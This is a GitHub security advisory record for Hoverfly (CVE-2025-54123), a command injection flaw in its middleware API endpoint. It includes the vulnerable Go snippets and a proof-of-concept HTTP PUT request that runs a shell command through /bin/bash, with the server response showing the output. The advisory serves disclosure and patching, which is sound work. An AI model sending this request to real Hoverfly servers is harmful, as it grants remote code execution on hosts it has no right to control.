{
  "Severity": "CRITICAL",
  "UpdatedAt": "2025-09-10T19:48:43Z",
  "Package": {
    "Ecosystem": "GO",
    "Name": "github.com/SpectoLabs/hoverfly"
  },
  "Advisory": {
    "DatabaseId": 311051,
    "Id": "GSA_kwCzR0hTQS1yNGg4LWhmcDItZ2dtZs4ABL8L",
    "GhsaId": "GHSA-r4h8-hfp2-ggmf",
    "References": [
      {
        "Url": "https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-r4h8-hfp2-ggmf"
      },
      {
        "Url": "https://github.com/SpectoLabs/hoverfly/pull/1203"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-54123"
      },
      {
        "Url": "https://github.com/SpectoLabs/hoverfly/commit/17e60a9bc78826deb4b782dca1c1abd3dbe60d40"
      },
      {
        "Url": "https://github.com/SpectoLabs/hoverfly/commit/a9d4da7bd7269651f54542ab790d0c613d568d3e"
      },
      {
        "Url": "https://github.com/SpectoLabs/hoverfly/blob/master/core/hoverfly_service.go#L173"
      },
      {
        "Url": "https://github.com/SpectoLabs/hoverfly/blob/master/core/middleware/local_middleware.go#L13"
      },
      {
        "Url": "https://github.com/SpectoLabs/hoverfly/blob/master/core/middleware/middleware.go#L93"
      },
      {
        "Url": "https://github.com/advisories/GHSA-r4h8-hfp2-ggmf"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-r4h8-hfp2-ggmf"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2025-54123"
      }
    ],
    "Description": "### Summary\nIt has been discovered that the middleware functionality in Hoverfly is vulnerable to command injection through its `/api/v2/hoverfly/middleware` endpoint due to insufficient validation and sanitization in user input.\n\n### Details\nThe vulnerability exists in the middleware management API endpoint `/api/v2/hoverfly/middleware`. \n\nThis issue is born due to combination of three code level flaws:\n\n1. Insufficient Input Validation in [middleware.go line 94-96](https://github.com/SpectoLabs/hoverfly/blob/master/core/middleware/middleware.go#L93):\n\n```\nfunc (this *Middleware) SetBinary(binary string) error {\n    this.Binary = binary  // No validation of binary parameter here\n    return nil\n}\n```\n\n2. Unsafe Command Execution in [local_middleware.go line 14-19](https://github.com/SpectoLabs/hoverfly/blob/master/core/middleware/local_middleware.go#L13):\n\n```\nvar middlewareCommand *exec.Cmd\nif this.Script == nil {\n    middlewareCommand = exec.Command(this.Binary)  // User-controlled binary\n} else {\n    middlewareCommand = exec.Command(this.Binary, this.Script.Name())  // User-controlled binary and script\n}\n```\n\n3. Immediate Execution During Testing in [hoverfly_service.go line 173](https://github.com/SpectoLabs/hoverfly/blob/master/core/hoverfly_service.go#L173):\n\n```\n_, err = newMiddleware.Execute(testData)  // Executes middleware immediately for testing\n```\n\n### POC\n\n1. Send the below HTTP PUT request to `http://localhost:8888` in order to create our malicious middleware, this will execute a simple `whoami` command on target. (ADMIN UI/API)\n\nHere, when you send this request, The hoverify will processes the request and writes the script to a temporary file and During middleware validation, Hoverfly executes: `/bin/bash /tmp/{hoverfly_script}`, and Boom! The malicious script will get executed with Hoverfly's privileges.\n\n```\nPUT /api/v2/hoverfly/middleware HTTP/1.1\nHost: localhost:8888\nsec-ch-ua-platform: \"macOS\"\nAccept-Language: en-US,en;q=0.9\nAccept: application/json, text/plain, */*\nsec-ch-ua: \"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\"\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36\nsec-ch-ua-mobile: ?0\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: http://localhost:8888/dashboard\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\nContent-Type: application/json\nContent-Length: 101\n\n{\n    \"binary\": \"/bin/bash\",\n    \"script\": \"whoami\"\n}\n```\n\n```\nHTTP/1.1 422 Unprocessable Entity\nDate: Sat, 12 Jul 2025 15:55:49 GMT\nContent-Length: 540\nContent-Type: text/plain; charset=utf-8\n\n{\"error\":\"Failed to unmarshal JSON from middleware\\nCommand: /bin/bash /var/folders/c6/c708mhjj12j_d5sg_s80pybc0000gn/T/hoverfly/hoverfly_2749637664\\ninvalid character 'k' looking for beginning of value\\n\\nSTDIN:\\n{\\\"response\\\":{\\\"status\\\":200,\\\"body\\\":\\\"ok\\\",\\\"encodedBody\\\":false,\\\"headers\\\":{\\\"test_header\\\":[\\\"true\\\"]}},\\\"request\\\":{\\\"path\\\":\\\"/\\\",\\\"method\\\":\\\"GET\\\",\\\"destination\\\":\\\"www.test.com\\\",\\\"scheme\\\":\\\"\\\",\\\"query\\\":\\\"\\\",\\\"formData\\\":null,\\\"body\\\":\\\"\\\",\\\"headers\\\":{\\\"test_header\\\":[\\\"true\\\"]}}}\\n\\nSTDOUT:\\nkr1shna4garwal\\n\"}\n```\n(Here, the user is `kr1shna4garwal`)\n\n### Impact\n\nThis allows an attacker to gain remote code execution (RCE) on any system running the vulnerable Hoverfly service. Since the input is directly passed to system commands without proper checks, an attacker can upload a malicious payload or directly execute arbitrary commands (including reverse shells) on the host server with the privileges of the hoverfly process.\n\nReporter:\n@kr1shna4garwal",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-09-10T19:48:43Z",
    "Severity": "CRITICAL",
    "Summary": "Hoverfly is vulnerable to Remote Code Execution through an insecure middleware implementation",
    "UpdatedAt": "2025-09-13T03:08:57Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 9.8,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": ""
      },
      "VulnerableVersionRange": "\u003c= 1.11.3"
    }
  ]
}